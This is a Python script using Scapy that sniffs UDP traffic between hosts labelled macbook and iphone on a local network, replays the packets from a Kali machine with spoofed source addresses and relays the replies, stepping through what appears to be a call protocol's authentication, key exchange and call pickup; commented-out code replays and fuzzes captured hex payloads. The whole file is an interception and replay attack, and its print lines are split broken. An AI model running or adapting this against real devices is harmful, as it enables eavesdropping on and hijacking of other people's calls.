import sys
from scapy.all import *

iphone = "192.168.0.103"
kali = "192.168.0.105"
macbook = "192.168.0.102"
work = "192.168.0.101"
pris = "192.168.0.104"
source = kali
destiny = iphone

payloads = ["0f000100082112a4422f357d1e8fb0a362d20c746380050004fff30000",
            "0f000100382112a44267a86c664659e438a3a07c6c00250004000000010006002436303736423130352d333836412d344331322d413330452d3030374542453836413543438005000482a30000",
            "2004000400d1c5f9b400000000b002ffffb4cd0000020405a0010303050101080a04f9a5f70000000004020000",
            "2004000400d1c5f9b45a0cd219b012ffff51070000020405a0010303050101080a04f9a65b18051f2704020000",
            "2004000400d1c5f9b55a0cd2198010100980af00000101080a04f9a65f18051f2d",
            "2004000400d1c5f9b55a0cd21980181009066000000101080a04f9a65f18051f2d00ea0200a07a748c52fa1d3c13f596f4de480e230cfc02deccdb8627593802abc6ecc3b2aa8d2da4d461c1de3a50f6960c0891787ffb3f13d7da1b929261180497a12adddc9e5194d1c6bc44e39b3cf041b4cb94d6d3ed6add38c5a3206a78a242e7004f83df8b3b52aaf91082fec594c4bae69def084c7758c9af7f5eaaf6f927f44d1341f1e255357b5b0e4f09e50aabef17b1d4e5167dab4cf41889c4b5c6bd48ab171546304402204cf0e9cec86228826745763d32a020dbe1a3a45f86842ad362aea39ee71bec12022004bc56f2157bbfedef707aae32f52e3eb89d78bb486b07bc760d6a38c0887863",
            "2004000400d1c5faa15a0cd2198018100999fe00000101080a04f9a67118051f2d01500201052f59a0b503b18971edfc90ea956a42648ad8a71aba3fec171285ecb26c60cf14f32218666dffa4540a562d953919b83a33747a550e939b07c1a8ea109b7b1083a27f05065d2f2553636aead3a3dfe9bf941b418cefa55c29f83c2886a10477e9f9882ae6af0931505dca37dd950cb4684b3637914bba7957951e3b045d64ed1551a24a061bb6443e393e0438ba0b729aabd6cd61d1b5e95fcff1758fd53cc359b2166242265826d00f380fc9fb63418943ac5b2fd4c8b7823e4063c68939b994d7b79ee2a308c4efafe7b7120e2aa32426003555c57d8f07705e51df82f6a371da59f45f43559669b1fb2663a1857605943052b1c839204265e1221b3130fe4f58b7109cbb473045022009438df5e374bbb78edcc05691c633f14190202424c26d28449044ea7b68f228022100b77841dec6d3647945cf5c707996b30f44c7eb5b0a3702c2c3ed51633ae9963f",
            "2004000400d1c5fbf35a0cd306801010027d7900000101080a04f9a67118051f2d"

            ]

# payloads = [#"0f000100082112a4422f357d1e8fb0a362d20c746380050004fff30000", 
# 			#"0f000100382112a44267a86c664659e438a3a07c6c00250004000000010006002436303736423130352d333836412d344331322d413330452d3030374542453836413543438005000482a30000",
# 			#"0f000100082112a4422f357d1e8fb0a362d20c746380050004fff30000",
# 			#"0f000100082112a4422f357d1e8fb0a362d20c746380050004fff30000767867866776467567476467474",
# 			#"1z000100085672a4422f357d1e8fb0a362d20c746380050004fff30000767867866776467567476467474"
# 			"e0008e1a83fb0f1ed811437043c902a2e368729f390ceebc93bbd5c5326712369b30612b1c1363a6bf70faf3326c119d5734f47a255d599b59cf8e2091d54a73f4eefbdd3ddbcb7ad811b045250863c1892c96728d6d2b3d72d48d6f0f3e38bd9884bd6ab8d825b7c3f14696affc46aa5f6b606ed039707da9c49eb295f6d911821973dd1b65ad773776dc564da5e7e70f3547b654ee6ac066bef8106366e377ea7293",
# 			"e0008e1a83fb0f1ed811437043c902a2e368729f390ceebc93bbd5c5326712369b30612b1c1363a6bf70faf3326c119d5734f47a255d599b59cf8e2091d54a73f4eefbdd3ddbcb7ad811b045250863c1892c96728d6d2b3d72d48d6f0f3e38bd9884bd6ab8d825b7c3f14696affc46aa5f6b606ed039707da9c49eb295f6d911821973dd1b65ad773776dc564da5e7e70f3547b654ee6ac066bef8106366e377ea7293",
# 			"e0008e1a83fb0f1ed811437043c902a2e368729f390ceebc93bbd5c5326712369b30612b1c1363a6bf70faf3326c119d5734f47a255d599b59cf8e2091d54a73f4eefbdd3ddbcb7ad811b045250863c1892c96728d6d2b3d72d48d6f0f3e38bd9884bd6ab8d825b7c3f14696affc46aa5f6b606ed039707da9c49eb295f6d911821973dd1b65ad773776dc564da5e7e70f3547b654ee6ac066bef8106366e377ea7293",
# 			"e0008e1a83fb0f1ed811437043c902a2e368729f390ceebc93bbd5c5326712369b30612b1c1363a6bf70faf3326c119d5734f47a255d599b59cf8e2091d54a73f4eefbdd3ddbcb7ad811b045250863c1892c96728d6d2b3d72d48d6f0f3e38bd9884bd6ab8d825b7c3f14696affc46aa5f6b606ed039707da9c49eb295f6d911821973dd1b65ad773776dc564da5e7e70f3547b654ee6ac066bef8106366e377ea7293",
# 			"e0008e1a83fb0f1ed811437043c902a2e368729f390ceebc93bbd5c5326712369b30612b1c1363a6bf70faf3326c119d5734f47a255d599b59cf8e2091d54a73f4eefbdd3ddbcb7ad811b045250863c1892c96728d6d2b3d72d48d6f0f3e38bd9884bd6ab8d825b7c3f14696affc46aa5f6b606ed039707da9c49eb295f6d911821973dd1b65ad773776dc564da5e7e70f3547b654ee6ac066bef8106366e377ea7293",
# 			"e0008e1a83fb0f1ed811437043c902a2e368729f390ceebc93bbd5c5326712369b30612b1c1363a6bf70faf3326c119d5734f47a255d599b59cf8e2091d54a73f4eefbdd3ddbcb7ad811b045250863c1892c96728d6d2b3d72d48d6f0f3e38bd9884bd6ab8d825b7c3f14696affc46aa5f6b606ed039707da9c49eb295f6d911821973dd1b65ad773776dc564da5e7e70f3547b654ee6ac066bef8106366e377ea7293",
# 			"e0008e1a83fb0f1ed811437043c902a2e368729f390ceebc93bbd5c5326712369b30612b1c1363a6bf70faf3326c119d5734f47a255d599b59cf8e2091d54a73f4eefbdd3ddbcb7ad811b045250863c1892c96728d6d2b3d72d48d6f0f3e38bd9884bd6ab8d825b7c3f14696affc46aa5f6b606ed039707da9c49eb295f6d911821973dd1b65ad773776dc564da5e7e70f3547b654ee6ac066bef8106366e377ea7293",
# 			"e0008e1a83fb0f1ed811437043c902a2e368729f390ceebc93bbd5c5326712369b30612b1c1363a6bf70faf3326c119d5734f47a255d599b59cf8e2091d54a73f4eefbdd3ddbcb7ad811b045250863c1892c96728d6d2b3d72d48d6f0f3e38bd9884bd6ab8d825b7c3f14696affc46aa5f6b606ed039707da9c49eb295f6d911821973dd1b65ad773776dc564da5e7e70f3547b654ee6ac066bef8106366e377ea7293",
# 			"e0000421c0013ad61d4a999a138f47fdbc6672df3b4481ce09fe9a55d63c7114cb0759fa3935f40620a0e27afcfdf3dd9dec5a7bc9de498eb6b533e33fbd7dea124b8bde460e8cd87a538580ef4481d769fb883e594d63e6024b206f3f6151eba7098329d87f4a797a5d56a6914c7299da766dfcc3a978e4d326e4",


# 			]

dport = 0
sport = 61234

# Auth
print
"waiting for Auth..."
myfilter = "udp and src %s and dst %s and data contains 0f000100082112a442" % (macbook, iphone)
s = sniff(filter=myfilter, count=1)
sport = s[0].sport
dport = s[0].dport
response = sr1(IP(src=source, dst=iphone) / UDP(sport=sport, dport=dport) / s[0].load)
response.show()
send(IP(src=source, dst=macbook) / UDP(sport=response.sport, dport=response.dport) / response.load)

# #Key exchange
print
"waiting for key exchange..."
myfilter = "udp and src %s and dst %s and data contains 0f000100382112a442" % (macbook, iphone)
s = sniff(filter=myfilter, count=1)
response = sr1(IP(src=source, dst=iphone) / UDP(sport=sport, dport=dport) / s[0].load)
response.show()
send(IP(src=source, dst=macbook) / UDP(sport=response.sport, dport=response.dport) / response.load)

# Descolgar
print
"waiting to pickup..."
myfilter = "udp and src %s and dst %s and data contains" % (macbook, kali)
# while s[0].load == None:
s = sniff(filter=myfilter, count=1)
response = sr1(IP(src=source, dst=iphone) / UDP(sport=sport, dport=dport) / s[0].load)
response.show()
send(IP(src=source, dst=macbook) / UDP(sport=response.sport, dport=response.dport) / response.load)

# Descolgar 2
print
"waiting for pickup 2..."
s = sniff(filter=myfilter, count=1)
response = sr1(IP(src=source, dst=iphone) / UDP(sport=sport, dport=dport) / s[0].load)
response.show()
send(IP(src=source, dst=macbook) / UDP(sport=response.sport, dport=response.dport) / response.load)

# print "waiting..."
# s = sniff(filter=myfilter, count=1)

# # Descolgar
# response = sr1(IP(src=source, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=source, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# print "waiting..."
# s = sniff(filter=myfilter, count=1)

# # Descolgar
# response = sr1(IP(src=source, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=source, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# s = sniff(filter=myfilter, count=1)

# # Descolgar
# response = sr1(IP(src=kali, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=kali, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# s = sniff(filter=myfilter, count=1)

# # Descolgar
# response = sr1(IP(src=kali, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=kali, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# s = sniff(filter=myfilter, count=1)

# # Descolgar
# response = sr1(IP(src=kali, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=kali, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# s = sniff(filter=myfilter, count=1)

# # Descolgar
# response = sr1(IP(src=kali, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=kali, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# s = sniff(filter=myfilter, count=1)


# for i in range(0, len(payloads)):
# 	print "\n\n\n--------------------PAYLOAD%d--------------------\n\n" % i
# 	p = sr1(IP(src=macbook, dst=iphone)/UDP(sport=sport, dport=dport)/payloads[i].decode('hex'))


# 	if p:
# 		p.show()
